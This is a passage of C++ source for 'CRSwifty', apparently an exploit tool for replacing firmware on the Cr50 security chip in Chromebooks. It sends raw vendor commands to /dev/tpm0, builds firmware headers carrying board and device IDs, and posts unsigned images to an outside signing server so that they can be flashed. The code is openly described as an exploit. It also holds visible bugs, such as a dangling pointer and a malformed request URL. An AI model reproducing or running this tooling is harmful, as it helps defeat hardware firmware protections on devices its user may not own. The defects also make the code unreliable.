#include <errno.h>
// #define __USE_MISC
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <unistd.h>
#include <linux/types.h>
// #include <libtpms/tpm_library.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <sys/stat.h>
#include "tpm_vendor_cmds.h"
#include <math.h>
#include "main.h"
#include <getopt.h>
#include <curl/curl.h>
#include <string>
// #include <format>
// #include <string>
using namespace std;

// TODO(all other ecsmasher members): Cleanup comments, and legacy code.
#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
// CRSwifty terminal setup, and exploit
#define FUSE_PADDING 0x55555555 /* baked in hw! */
#define FUSE_IGNORE 0xa3badaac	/* baked in rom! */
#define FUSE_MAX 128			/* baked in rom! */

#define INFO_MAX 128		   /* baked in rom! */
#define INFO_IGNORE 0xaa3c55c3 /* baked in rom! */

#define MAGIC_HAVEN 0xFFFFFFFF
#define MAGIC_DAUNTLESS 0xFFFFFFFD
typedef struct
{
	int vendor_cmd;
	size_t name_length;
	const char *name;

} VendorCommand;
enum fw_type
{
	RO = 0,
	RW = 1
};
static string fwType;
static fw_type fwTypeEnum;
struct SignedHeader
{
	uint32_t magic; /* -1 (thanks, boot_sys!) */
	uint32_t signature[96];
	uint32_t img_chk_; /* top 32 bit of expected img_hash */
	/* --------------------- everything below is part of img_hash */
	uint32_t tag[7];  /* words 0-6 of RWR/FWR */
	uint32_t keyid;	  /* word 7 of RWR */
	uint32_t key[96]; /* public key to verify signature with */
	uint32_t image_size;
	uint32_t ro_base; /* readonly region */
	uint32_t ro_max;
	uint32_t rx_base; /* executable region */
	uint32_t rx_max;
	uint32_t fusemap[FUSE_MAX / (8 * sizeof(uint32_t))];
	uint32_t infomap[INFO_MAX / (8 * sizeof(uint32_t))];
	uint32_t epoch_; /* word 7 of FWR */
	uint32_t major_; /* keyladder count */
	uint32_t minor_;
	uint64_t timestamp_; /* time of signing */
	uint32_t p4cl_;
	/* bits to and with FUSE_FW_DEFINED_BROM_APPLYSEC */
	uint32_t applysec_;
	/* bits to mesh with FUSE_FW_DEFINED_BROM_CONFIG1 */
	uint32_t config1_;
	/* bits to or with FUSE_FW_DEFINED_BROM_ERR_RESPONSE */
	uint32_t err_response_;
	/* action to take when expectation is violated */
	uint32_t expect_response_;

	union
	{
		// 2nd FIPS signature (gnubby RW / Cr51)
		struct
		{
			uint32_t keyid;
			uint32_t r[8];
			uint32_t s[8];
		} ext_sig;

		// FLASH trim override (Dauntless RO)
		// iff config1_ & 65536
		struct
		{
			uint32_t FSH_SMW_SETTING_OPTION3;
			uint32_t FSH_SMW_SETTING_OPTION2;
			uint32_t FSH_SMW_SETTING_OPTIONA;
			uint32_t FSH_SMW_SETTING_OPTIONB;
			uint32_t FSH_SMW_SMP_WHV_OPTION1;
			uint32_t FSH_SMW_SMP_WHV_OPTION0;
			uint32_t FSH_SMW_SME_WHV_OPTION1;
			uint32_t FSH_SMW_SME_WHV_OPTION0;
		} fsh;
	} u;

	/* Padding to bring the total structure size to 1K. */
	uint32_t _pad[5];
	struct
	{
		unsigned size : 12;
		unsigned offset : 20;
	} swap_mark;

	/* Field for managing updates between RW product families. */
	uint32_t rw_product_family_;
	/* Board ID type, mask, flags (stored ^SIGNED_HEADER_PADDING) */
	uint32_t board_id_type;
	uint32_t board_id_type_mask;
	uint32_t board_id_flags;
	uint32_t dev_id0_; /* node id, if locked */
	uint32_t dev_id1_;
	uint32_t fuses_chk_; /* top 32 bit of expected fuses hash */
	uint32_t info_chk_;	 /* top 32 bit of expected info hash */
};

#define VC_COMMAND_EXIT 65537
static VendorCommand vendor_cmds[] = {
	{EXTENSION_AES, sizeof("EXTENSION_AES"), "EXTENSION_AES"},
	{EXTENSION_HASH, sizeof("EXTENSION_HASH"), "EXTENSION_HASH"},
	{EXTENSION_RSA, sizeof("RSA"), "RSA"},
	{EXTENSION_ECC, sizeof("ECC"), "ECC"},
	{EXTENSION_FW_UPGRADE, sizeof("FW_UPGRADE"), "FW_UPGRADE"},
	{EXTENSION_HKDF, sizeof("HKDF"), "HKDF"},
	{EXTENSION_ECIES, sizeof("ECIES"), "ECIES"},
	{EXTENSION_POST_RESET, sizeof("POST_RESET"), "POST_RESET"},
	{LAST_EXTENSION_COMMAND, sizeof("LAST_EXTENSION_COMMAND"), "LAST_EXTENSION_COMMAND"},
	{VENDOR_CC_GET_LOCK, sizeof("VENDOR_CC_GET_LOCK"), "VENDOR_CC_GET_LOCK"},
	{VENDOR_CC_SET_LOCK, sizeof("VENDOR_CC_SET_LOCK"), "VENDOR_CC_SET_LOCK"},
	{VENDOR_CC_SYSINFO, sizeof("VENDOR_CC_SYSINFO"), "VENDOR_CC_SYSINFO"},
	{VENDOR_CC_IMMEDIATE_RESET, sizeof("VENDOR_CC_IMMEDIATE_RESET"), "VENDOR_CC_IMMEDIATE_RESET"},
	{VENDOR_CC_INVALIDATE_INACTIVE_RW, sizeof("VENDOR_CC_INVALIDATE_INACTIVE_RW"), "VENDOR_CC_INVALIDATE_INACTIVE_RW"},
	{VENDOR_CC_COMMIT_NVMEM, sizeof("VENDOR_CC_COMMIT_NVMEM"), "VENDOR_CC_COMMIT_NVMEM"},
	{VENDOR_CC_REPORT_TPM_STATE, sizeof("VENDOR_CC_REPORT_TPM_STATE"), "VENDOR_CC_REPORT_TPM_STATE"},
	{VENDOR_CC_TURN_UPDATE_ON, sizeof("VENDOR_CC_TURN_UPDATE_ON"), "VENDOR_CC_TURN_UPDATE_ON"},
	{VENDOR_CC_GET_BOARD_ID, sizeof("GET_BOARD_ID"), "GET_BOARD_ID"},
	{VENDOR_CC_SET_BOARD_ID, sizeof("VENDOR_CC_SET_BOARD_ID"), "VENDOR_CC_SET_BOARD_ID"},
	{VENDOR_CC_U2F_APDU, sizeof("VENDOR_CC_U2F_APDU"), "VENDOR_CC_U2F_APDU"},
	{VENDOR_CC_POP_LOG_ENTRY, sizeof("VENDOR_CC_POP_LOG_ENTRY"), "VENDOR_CC_POP_LOG_ENTRY"},
	{VENDOR_CC_GET_REC_BTN, sizeof("VENDOR_CC_GET_REC_BTN"), "VENDOR_CC_GET_REC_BTN"},
	{VENDOR_CC_RMA_CHALLENGE_RESPONSE, sizeof("VENDOR_CC_RMA_CHALLENGE_RESPONSE"), "VENDOR_CC_RMA_CHALLENGE_RESPONSE"},
	{VENDOR_CC_DISABLE_FACTORY, sizeof("VENDOR_CC_DISABLE_FACTORY"), "VENDOR_CC_DISABLE_FACTORY"},
	{VENDOR_CC_CCD, sizeof("VENDOR_CC_CCD"), "VENDOR_CC_CCD"},
	{VENDOR_CC_GET_ALERTS_DATA, sizeof("VENDOR_CC_GET_ALERTS_DATA"), "VENDOR_CC_GET_ALERTS_DATA"},
	{VENDOR_CC_SPI_HASH, sizeof("VENDOR_CC_SPI_HASH"), "VENDOR_CC_SPI_HASH"},
	{VENDOR_CC_PINWEAVER, sizeof("VENDOR_CC_PINWEAVER"), "VENDOR_CC_PINWEAVER"},
	{VENDOR_CC_RESET_FACTORY, sizeof("VENDOR_CC_RESET_FACTORY"), "VENDOR_CC_RESET_FACTORY"},
	{VENDOR_CC_WP, sizeof("VENDOR_CC_WP"), "VENDOR_CC_WP"},
	{VENDOR_CC_TPM_MODE, sizeof("VENDOR_CC_TPM_MODE"), "VENDOR_CC_TPM_MODE"},
	{VENDOR_CC_SN_SET_HASH, sizeof("VENDOR_CC_SN_SET_HASH"), "VENDOR_CC_SN_SET_HASH"},
	{VENDOR_CC_SN_INC_RMA, sizeof("VENDOR_CC_SN_INC_RMA"), "VENDOR_CC_SN_INC_RMA"},
	{VENDOR_CC_GET_PWR_BTN, sizeof("VENDOR_CC_GET_PWR_BTN"), "VENDOR_CC_GET_PWR_BTN"},
	{VENDOR_CC_U2F_GENERATE, sizeof("VENDOR_CC_U2F_GENERATE"), "VENDOR_CC_U2F_GENERATE"},
	{VENDOR_CC_U2F_SIGN, sizeof("VENDOR_CC_U2F_SIGN"), "VENDOR_CC_U2F_SIGN"},
	{VENDOR_CC_U2F_ATTEST, sizeof("VENDOR_CC_U2F_ATTEST"), "VENDOR_CC_U2F_ATTEST"},
	{VENDOR_CC_FLOG_TIMESTAMP, sizeof("VENDOR_CC_FLOG_TIMESTAMP"), "VENDOR_CC_FLOG_TIMESTAMP"},
	{VENDOR_CC_ENDORSEMENT_SEED, sizeof("VENDOR_CC_ENDORSEMENT_SEED"), "VENDOR_CC_ENDORSEMENT_SEED"},
	{VENDOR_CC_U2F_MODE, sizeof("VENDOR_CC_U2F_MODE"), "VENDOR_CC_U2F_MODE"},
	{VENDOR_CC_DRBG_TEST, sizeof("VENDOR_CC_DRBG_TEST"), "VENDOR_CC_DRBG_TEST"},
	{VENDOR_CC_TRNG_TEST, sizeof("VENDOR_CC_TRNG_TEST"), "VENDOR_CC_TRNG_TEST"},
	{VENDOR_CC_GET_BOOT_MODE, sizeof("VENDOR_CC_GET_BOOT_MODE"), "VENDOR_CC_GET_BOOT_MODE"},
	{VENDOR_CC_RESET_EC, sizeof("VENDOR_CC_RESET_EC"), "VENDOR_CC_RESET_EC"},
	{VENDOR_CC_SEED_AP_RO_CHECK, sizeof("VENDOR_CC_SEED_AP_RO_CHECK"), "VENDOR_CC_SEED_AP_RO_CHECK"},
	{VENDOR_CC_FIPS_CMD, sizeof("VENDOR_CC_FIPS_CMD"), "VENDOR_CC_FIPS_CMD"},
	{VENDOR_CC_GET_AP_RO_HASH, sizeof("VENDOR_CC_GET_AP_RO_HASH"), "VENDOR_CC_GET_AP_RO_HASH"},
	{VENDOR_CC_GET_AP_RO_STATUS, sizeof("VENDOR_CC_GET_AP_RO_STATUS"), "VENDOR_CC_GET_AP_RO_STATUS"},
	{VENDOR_CC_AP_RO_VALIDATE, sizeof("VENDOR_CC_AP_RO_VALIDATE"), "VENDOR_CC_AP_RO_VALIDATE"},
	{VENDOR_CC_DS_DIS_TEMP, sizeof("VENDOR_CC_DS_DIS_TEMP"), "VENDOR_CC_DS_DIS_TEMP"},
	{VENDOR_CC_USER_PRES, sizeof("VENDOR_CC_USER_PRES"), "VENDOR_CC_USER_PRES"},
	{VENDOR_CC_POP_LOG_ENTRY_MS, sizeof("VENDOR_CC_POP_LOG_ENTRY_MS"), "VENDOR_CC_POP_LOG_ENTRY_MS"},
	{VENDOR_CC_GET_AP_RO_VERIFY_SETTING, sizeof("VENDOR_CC_GET_AP_RO_VERIFY_SETTING"), "VENDOR_CC_GET_AP_RO_VERIFY_SETTING"},
	{VENDOR_CC_SET_AP_RO_VERIFY_SETTING, sizeof("VENDOR_CC_SET_AP_RO_VERIFY_SETTING"), "VENDOR_CC_SET_AP_RO_VERIFY_SETTING"},
	{VENDOR_CC_SET_CAPABILITY, sizeof("VENDOR_CC_SET_CAPABILITY"), "VENDOR_CC_SET_CAPABILITY"},
	{VENDOR_CC_GET_TI50_STATS, sizeof("VENDOR_CC_GET_TI50_STATS"), "VENDOR_CC_GET_TI50_STATS"},
	{VENDOR_CC_GET_CRASHLOG, sizeof("VENDOR_CC_GET_CRASHLOG"), "VENDOR_CC_GET_CRASHLOG"},
	{VENDOR_CC_GET_CONSOLE_LOGS, sizeof("VENDOR_CC_GET_CONSOLE_LOGS"), "VENDOR_CC_GET_CONSOLE_LOGS"},
	{VENDOR_CC_GET_FACTORY_CONFIG, sizeof("VENDOR_CC_GET_FACTORY_CONFIG"), "VENDOR_CC_GET_FACTORY_CONFIG"},
	{VENDOR_CC_SET_FACTORY_CONFIG, sizeof("VENDOR_CC_SET_FACTORY_CONFIG"), "VENDOR_CC_SET_FACTORY_CONFIG"},
	{VENDOR_CC_GET_TIME, sizeof("VENDOR_CC_GET_TIME"), "VENDOR_CC_GET_TIME"},
	{VENDOR_CC_GET_BOOT_TRACE, sizeof("VENDOR_CC_GET_BOOT_TRACE"), "VENDOR_CC_GET_BOOT_TRACE"},
	{VENDOR_CC_GET_CR50_METRICS, sizeof("VENDOR_CC_GET_CR50_METRICS"), "VENDOR_CC_GET_CR50_METRICS"},
	{LAST_VENDOR_COMMAND, sizeof("LAST_VENDOR_COMMAND"), "LAST_VENDOR_COMMAND"},
	{VC_COMMAND_EXIT, sizeof("EXIT"), "EXIT"}};

int setupTTY(int fd, int speed, int parity)
{
	// sizeof(uint32_t)
	struct termios tty;
	tcgetattr(fd, &tty);
	cfsetospeed(&tty, speed);
	cfsetispeed(&tty, speed);
	tty.c_cflag = (tty.c_cflag & ~CSIZE) | CS8;
	// https://stackoverflow.com/questions/6947413/how-to-open-read-and-write-from-serial-port-in-c

	tty.c_iflag &= ~IGNBRK; // disable break processing
	tty.c_lflag = 0;		// no signaling chars, no echo,
							// no canonical processing
	// tty.c_oflag = 0;        // no remapping, no delays
	tty.c_cc[VMIN] = 0;	 // read doesn't block
	tty.c_cc[VTIME] = 5; // 0.5 seconds read timeout

	tty.c_iflag &= ~(IXON | IXOFF | IXANY); // shut off xon/xoff ctrl

	tty.c_cflag |= (CLOCAL | CREAD); // ignore modem controls,
									 // enable reading
	// tty.c_cflag &= ~(PARENB | PARODD); // shut off parity
	tty.c_cflag |= parity;
	tty.c_cflag &= ~CSTOPB;
	tty.c_cflag &= ~CRTSCTS;
	tcsetattr(fd, TCSANOW, &tty);
	return 0;
}
struct upgrade_pkt
{
	__be16 tag;
	__be32 length;
	__be32 ordinal;
	__be16 subcmd;
	union
	{
		/*
		 * Upgrade PDUs as opposed to all other vendor and extension
		 * commands include two additional fields in the header.
		 */
		struct
		{
			__be32 digest;
			__be32 address;
			char data[0];
		} upgrade;
		struct
		{
			char data[0];
		} command;
	};
} __packed;
// The above code came from: https://stackoverflow.com/questions/6947413/how-to-open-read-and-write-from-serial-port-in-c ^

// All functions below until main came from https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/platform/gsc-utils/extra/usb_updater/gsctool.c but is modified for use with crswifty
static int tpm_send_pkt(int tpmFD, unsigned int digest,
						unsigned int addr, const void *data, int size,
						void *response, size_t *response_size,
						uint16_t subcmd)
{
	/* Used by transfer to /dev/tpm0 */
	static uint8_t outbuf[2048];
	static uint8_t raw_response[2048 +
								sizeof(struct upgrade_pkt)];
	struct upgrade_pkt *out = (struct upgrade_pkt *)outbuf;
	int len, done;
	int response_offset = offsetof(struct upgrade_pkt, command.data);
	void *payload;
	size_t header_size;
	uint32_t rv;
	const size_t rx_size = sizeof(raw_response);

	// debug("%s: sending to %#x %d bytes\n", __func__, addr, size);
	// printf("%s", __func__);
	out->tag = htobe16(0x8001);
	out->subcmd = htobe16(subcmd);

	if (subcmd <= LAST_EXTENSION_COMMAND)
		out->ordinal = htobe32(0xbaccd00a);
	else
		out->ordinal = htobe32(TPM_CC_VENDOR_BIT_MASK);

	// if (subcmd == EXTENSION_FW_UPGRADE)
	// {
	// 	/* FW Upgrade PDU header includes a couple of extra fields. */
	// 	out->upgrade.digest = digest;
	// 	out->upgrade.address = htobe32(addr);
	// 	header_size = offsetof(struct upgrade_pkt, upgrade.data);
	// }
	// else

	header_size = offsetof(struct upgrade_pkt, command.data);

	payload = outbuf + header_size;
	len = size + header_size;

	out->length = htobe32(len);
	memcpy(payload, data, size);

	done = write(tpmFD, out, len);

	if (done < 0)
	{
		perror("Could not write to TPM");
		return -1;
	}
	else if (done != len)
	{
		fprintf(stderr, "Error: Wrote %d bytes, expected to write %d\n",
				done, len);
		return -1;
	}

	int read_count;

	len = 0;
	do
	{
		uint8_t *rx_buf = raw_response + len;
		size_t rx_to_go = rx_size - len;

		read_count = read(tpmFD, rx_buf, rx_to_go);

		len += read_count;
	} while (read_count);
	len = len - response_offset;
	if (len < 0)
	{
		fprintf(stderr, "Problems reading from TPM, got %d bytes\n",
				len + response_offset);
		return -1;
	}

	if (response && response_size)
	{
		len = MIN(len, *response_size);
		memcpy(response, raw_response + response_offset, len);
		*response_size = len;
	}

	/* Return the actual return code from the TPM response header. */
	memcpy(&rv, &((struct upgrade_pkt *)raw_response)->ordinal, sizeof(rv));
	rv = be32toh(rv);

	/* Clear out vendor command return value offset.*/
	if ((rv & VENDOR_RC_ERR) == VENDOR_RC_ERR)
		rv &= ~VENDOR_RC_ERR;

	return rv;
}

// gsctool.c But is adapted for crswifty.
uint32_t send_vendor_command(int tpmFD,
							 uint16_t subcommand,
							 const void *command_body,
							 size_t command_body_size,
							 void *response,
							 size_t *response_size)
{
	int32_t rv;
	//  We don't need this code since its for updating over usb. However we aren't planning to send vendor commands over usb.
	// if (td->ep_type == usb_xfer) {
	// 	/*
	// 	 * When communicating over USB the response is always supposed
	// 	 * to have the result code in the first byte of the response,
	// 	 * to be stripped from the actual response body by this
	// 	 * function.
	// 	 */
	// 	uint8_t temp_response[MAX_RX_BUF_SIZE];
	// 	size_t max_response_size;

	// 	if (!response_size) {
	// 		max_response_size = 1;
	// 	} else if (*response_size < (sizeof(temp_response))) {
	// 		max_response_size = *response_size + 1;
	// 	} else {
	// 		fprintf(stderr,
	// 			"Error: Expected response too large (%zd)\n",
	// 			*response_size);
	// 		/* Should happen only when debugging. */
	// 		exit(update_error);
	// 	}

	// 	ext_cmd_over_usb(&td->uep, subcommand,
	// 			 command_body, command_body_size,
	// 			 temp_response, &max_response_size);
	// 	if (!max_response_size) {
	// 		/*
	// 		 * we must be talking to an older Cr50 firmware, which
	// 		 * does not return the result code in the first byte
	// 		 * on success, nothing to do.
	// 		 */
	// 		if (response_size)
	// 			*response_size = 0;
	// 		rv = 0;
	// 	} else {
	// 		rv = temp_response[0];
	// 		if (response_size) {
	// 			*response_size = max_response_size - 1;
	// 			memcpy(response,
	// 			       temp_response + 1, *response_size);
	// 		}
	// 	}
	// } else {

	rv = tpm_send_pkt(tpmFD, 0, 0,
					  command_body, command_body_size,
					  response, response_size, subcommand);

	// }

	return rv; /* This will be converted into uint32_t */
}
// s
// Curl frontend

struct vc_board_id
{
	uint32_t type;	   /* Board type */
	uint32_t type_inv; /* Board type (inverted) */
	uint32_t flags;	   /* Flags */
};
void handle_command(int tpmDescriptor, char *commandBuf, size_t commandBufLength)
{
	// printf("Command buffer length: %d\n", commandBufLength);

	VendorCommand *chosenVC = NULL;
	for (int i = 0; i < 65; i++)
	{
		VendorCommand vc = vendor_cmds[i];
		if (vc.name_length != commandBufLength)
		{
			// There is no way that this can be equal. Search for more possibilities.
			// printf("Exiting because no matching length;");
			continue;
		}
		int compared = strncasecmp(commandBuf, vc.name, vc.name_length - 1);
		if (!compared)
		{
			// printf("Handling command, just a sec...\n");
			chosenVC = &vc;
			break;
		};
	}
	if (!chosenVC)
	{
		printf("Invalid command\n");

		return;
	}
	if (chosenVC->vendor_cmd == VC_COMMAND_EXIT)
	{
		printf("User exited the terminal\n");
		printf("Cleaning up!\n");
		close(tpmDescriptor);
		exit(0);
		// Just in case
		return;
	}
	char response[2048 + sizeof(upgrade_pkt)];
	size_t responseSize;
	send_vendor_command(tpmDescriptor, chosenVC->vendor_cmd, NULL, 0, response, &responseSize);
	printf("Response, %s", response);
	struct upgrade_pkt *resp = (struct upgrade_pkt *)response;
	if (resp->subcmd == VENDOR_CC_GET_BOARD_ID)
	{
		vc_board_id *raw_data = (vc_board_id *)resp->command.data;
		printf("flags: 0x%x", raw_data->flags);
		printf("type: 0x%x", raw_data->type);

		return;
	}

	printf("Couldn't deserialize response\n.");
	return;
}
void set_blocking(int fd, int should_block)
{
	struct termios tty;
	memset(&tty, 0, sizeof tty);
	if (tcgetattr(fd, &tty) != 0)
	{
		// error_message ("error %d from tggetattr", errno);
		return;
	}

	tty.c_cc[VMIN] = should_block ? 1 : 0;
	tty.c_cc[VTIME] = 20; // 0.5 seconds read timeout
	tcsetattr(fd, TCSANOW, &tty);
	// if (tcsetattr (fd, TCSANOW, &tty) != 0)
	// error_message ("error %d setting term attributes", errno);
}
uint8_t *readFileOrDie(const char *path, size_t *length_ptr)
{
	struct stat s;
	int fd = open(path, O_RDWR);
	if (!fd)
	{
		printf("Failed to open file: %s", path);
		exit(-1);
	}
	int err = fstat(fd, &s);
	if (err != 0)
	{
		printf("Failed to stat file: %s", path);
		exit(-1);
	}
	long sz = s.st_size;
	*length_ptr = sz;
	uint8_t *buf = (uint8_t *)malloc(sz);

	read(fd, buf, sz);

	return buf;
}
void freeFile(uint8_t *buf)
{
	free(buf);
}
static int verbose_flag = false;
static int offline_flag = false;

static const char *usageString =
	"%s -f <firmware file> [-d <device path>] [--verbose]\n"
	"    -f <Firmware file>: Specify the ec.RO.elf file that will be pushed into the cr50 chip. This should come with the zip file. Required.\n"
	"    [-d <Device Path>]: Specify the path to the device. Default=/dev/tpm0 \n"
	"    [-s <Image Signing Server] Specifies the signing server used for signing the firmware. Optional.\n"
	"    --verbose: Specify whether you want verbose logging\n"
	"    -l Specify whether the image is locked and has \"DEV_IDS\". First try this program without locking, and then with locking.\n"
	"    [-t RO|RW] Specify whether we are modifying the RO or RW firmware of the CR50.\n"
	"    [--offline] Specify whether this should run in offline mode (for RMA shims). If this is specified, the firmware file must be signed before hand\n"
	"    [--sysinfo] Get the system info without running the exploit.\n";

void usage(const char *progname)
{

	printf(usageString, progname);
}
#define BLANK_FIELD 0xffffffff

int board_id_type_is_blank(const struct vc_board_id *id)
{
	return (id->type & id->type_inv) == BLANK_FIELD;
}

static int board_id_flags_are_blank(const struct vc_board_id *id)
{
	return id->flags == BLANK_FIELD;
}

int board_id_is_blank(const struct vc_board_id *id)
{
	return board_id_type_is_blank(id) && board_id_flags_are_blank(id);
}
static int sysinfo_only = 0;
static bool lockImage = false;
static struct option longopts[] = {
	{"verbose", no_argument, &verbose_flag, 1},
	{"sysinfo", no_argument, &sysinfo_only, 1},
	{"version", no_argument, &offline_flag, 1},
	{0, 0, 0, 0}};
static string lockImageOpt = "false";

int32_t check_board_id_vs_header(const struct vc_board_id *id,
								 const struct SignedHeader *h)
{
	uint32_t mismatch;
	uint32_t header_board_id_type;
	uint32_t header_board_id_mask;
	uint32_t header_board_id_flags;

	/* Blank Board ID matches all headers */
	if (board_id_is_blank(id))
		return 0;

	header_board_id_type = SIGNED_HEADER_PADDING ^ h->board_id_type;
	header_board_id_mask = SIGNED_HEADER_PADDING ^ h->board_id_type_mask;
	header_board_id_flags = SIGNED_HEADER_PADDING ^ h->board_id_flags;

	/*
	 * All 1-bits in header Board ID flags must be present in flags from
	 * flash
	 */
	mismatch =
		((header_board_id_flags & id->flags) != header_board_id_flags);
	/*
	 * Masked bits in header Board ID type must match type and inverse from
	 * flash.
	 */

	if (!mismatch && !board_id_type_is_blank(id))
	{
		mismatch = header_board_id_type ^ id->type;		  // 0 ^ id->type would only allow the bits with one to carry one. header_board_id_type = id->type ^ SIGNED_HEADER_PADDING
		mismatch |= header_board_id_type ^ ~id->type_inv; // mismatch is or'ed with header_board_id_type ^ ~id->type_inv. This means that header_board_id_type ^ ~id->type_inv must be equal to zero. That means id->type_inv = ~id->type.
		mismatch &= header_board_id_mask;				  // header_board_id_type = id->type ^ SIGNED_HEADER_PADDING. header_board_id_mask = 0xFFFF
	}
	return mismatch;
}
static void populateSignedHeaderWithBoardID(struct vc_board_id bid, struct SignedHeader *hdr)
{
	hdr->board_id_flags = bid.flags ^ SIGNED_HEADER_PADDING;
	hdr->board_id_type = bid.type ^ SIGNED_HEADER_PADDING;
	hdr->board_id_type_mask = 0xFFFF;
}
static const char *imageSigningServer = "https://crswifty.k1llswitch.live/sign";
struct url_response
{
	uint8_t response_code;
	uint8_t *body;
	size_t bodySize;
};
struct curl_callback_userdata
{
	const char *url;
	uint8_t *body;
	size_t bodylen;
	url_response *response;

	// size_t urlLength;
};

size_t write_callback(char *ptr, size_t size, size_t nmemb, curl_callback_userdata *userdata)
{
	// printf("Data recv'ed: %s from url %s\n", ptr, userdata->url);
	url_response *resp = userdata->response;
	size_t realsize = size * nmemb;
	char *body = (char *)realloc(resp->body, resp->bodySize + realsize + 1); // Resize buffer, with original contents copied.
	memcpy(&(body[resp->bodySize]), ptr, realsize);							 // Write new body after the original buffer.
	// printf("%d\n", nmemb);
	// printf("hi\n");
	userdata->response->body = (uint8_t *)body;
	userdata->response->bodySize += realsize;

	return size * nmemb;
}
static url_response sendRequestToURL(const char *url, uint8_t *body, size_t bodylen)
{
	char *ptr = strdup(url);
	// Now lets setup curl
	CURL *curl = curl_easy_init();
	curl_slist *hs = NULL;
	hs = curl_slist_append(hs, "Content-Type: application/octet-stream");
	hs = curl_slist_append(hs, "Accept: application/octet-stream");

	struct url_response *response = (url_response *)malloc(sizeof(url_response));
	memset(response, 0, sizeof(url_response));
	response->body = (uint8_t *)malloc(1);
	response->bodySize = 0;
	response->response_code = 0;
	struct curl_callback_userdata data = {
		ptr,
		body,
		bodylen,
		response};
	// curl_mime* mime = curl_mime_init(curl);
	curl_off_t ridiculous = 1 << 48;

	printf("BDOYLEN: %d", bodylen);
	curl_easy_setopt(curl, CURLOPT_USE_SSL, 1);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
	curl_easy_setopt(curl, CURLOPT_MAXFILESIZE_LARGE, ridiculous);
	curl_easy_setopt(curl, CURLOPT_SERVER_RESPONSE_TIMEOUT, 10000);
	curl_easy_setopt(curl, CURLOPT_HTTPPOST, 1);
	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
	// curl_easy_setopt(curl, CURLOPT_BUFFERSIZE, 120000L);
	curl_easy_setopt(curl, CURLOPT_URL, ptr);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, bodylen);
	curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
	curl_easy_perform(curl); // This is synchronous so this is ok.
	long response_code, response_size;
	curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
	curl_easy_getinfo(curl, CURLINFO_CONTENT_LENGTH_DOWNLOAD, &response_size);
	response->response_code = response_code;
	// response.bodySize = response_size;
	// printf("Received response code: %d\n", response_code);
	return *response;
}
static const char *url;
static const char *query;
static size_t queryLen;
static char *stringCat(char *a, char *b)
{
	size_t aLen = strlen(a);
	size_t bLen = strlen(b);
	size_t newBufLen = aLen + bLen + 1;
	char *buf = (char *)malloc(newBufLen);
	memcpy(buf, a, aLen);
	memcpy(buf + aLen, b, bLen);
	memset(buf + aLen + bLen, '\0', 1);

	return buf;
}
void getString(struct url_response s, char **resp, uint8_t *len_ptr)
{
	char *buf = (char *)malloc(s.bodySize + 1);
	memcpy(buf, s.body, s.bodySize);
	buf[s.bodySize] = '\0';
	*resp = buf;
	*len_ptr = s.bodySize + 1;
}
// epoch.major.minor
struct version_image
{
	uint32_t epoch, major, minor;
};
static url_response getSignedImageFromServer(struct vc_board_id *bid, uint32_t devId0, uint32_t devId1, uint8_t *unsignedBinary, size_t len, version_image vi)
{
	printf("Signing image using the server from k1llswitch.live/crswifty/sign\n");

	uint32_t header_board_id_type = bid->type ^ SIGNED_HEADER_PADDING;
	uint32_t header_board_id_mask = 0xFFFF ^ SIGNED_HEADER_PADDING;
	uint32_t header_board_id_flags = bid->flags ^ SIGNED_HEADER_PADDING;

	// header_board_id_type = SIGNED_HEADER_PADDING;
	// Maximum amount of character: 3 sets of hexadecimals, 2 colons, and one null terminator
	char board_id_string[8 * 3 + 1 * 2 + 1];

	snprintf(board_id_string, sizeof(board_id_string), "%X:%X:%X", header_board_id_type, header_board_id_mask, header_board_id_flags);
	char dev_id_string[8 * 2 + 1 + 1];
	uint32_t header_devid0 = devId0;
	uint32_t header_devid1 = devId1;
	if (!lockImage)
	{
		// Set devid to SIGNED_HEADER_PADDING if the image isn't locked.
		header_devid0 = SIGNED_HEADER_PADDING;
		header_devid1 = SIGNED_HEADER_PADDING;
	};

	snprintf(dev_id_string, sizeof(dev_id_string), "%x:%x", header_devid0, header_devid1);
	CURL *curl = curl_easy_init();
	char *dev_id_escaped = curl_easy_escape(curl, dev_id_string, sizeof(dev_id_string));
	char *board_id_escaped = curl_easy_escape(curl, board_id_string, sizeof(board_id_string));
	// string url1(url);
	// Create firmware type from enum
	string fwTypeTo;
	if (fwTypeEnum == RO)
	{
		fwTypeTo.assign("RO");
	}
	else if (fwTypeEnum == RW)
	{
		fwTypeTo.assign("RW");
	}
	int versionSize = snprintf(NULL, 0, "%d.%d.%d", vi.epoch, vi.major, vi.minor);
	char *versionStr = new char[versionSize + 1];
	sprintf(versionStr, "%d.%d.%d", vi.epoch, vi.major, vi.minor);

	char *version_escaped = curl_easy_escape(curl, versionStr, versionSize + 1);
	curl_easy_cleanup(curl);

	int size = snprintf(NULL, 0, "%s?board_id=%s&dev_id=%s&fwtype=%s&version=%s", imageSigningServer, board_id_escaped, dev_id_escaped, fwTypeTo.c_str(), version_escaped) + 1; // Gotta have that null-terminator
	char *newBuf = (char *)malloc(size * sizeof(char));
	sprintf(newBuf, "%s?board_id=%s&dev_id=%s&fwtype=%s", imageSigningServer, board_id_string, dev_id_string, fwTypeTo.c_str());
	printf("Created URL: %s\n", newBuf);
	// string formedURL;
	// formedURL.assign(newBuf);
	// free(dev_id_string);
	// free(board_id_string);
	url_response resp = sendRequestToURL(strdup(newBuf), unsignedBinary, len);
	free(newBuf);

	if (resp.response_code != 200)
	{

		char *responseData;
		uint8_t len;
		getString(resp, &responseData, &len);
		printf("The image signing was unsucessful for the following reason: %s. Exiting.\n", responseData);
		free(responseData);
		exit(-1);
		// return -1;
	}
	return resp;
}

fw_type parseFwTypeEnum()
{
	fwTypeEnum = RO; // Default to RO Firmware. If RW Firmware is specified, use RW Firmware.
	if (fwType.empty())
	{
		return fwTypeEnum;
	}
	if (fwType.rfind("RW", 0) == 0)
	{
		printf("Using it as RW Firmware.\n");
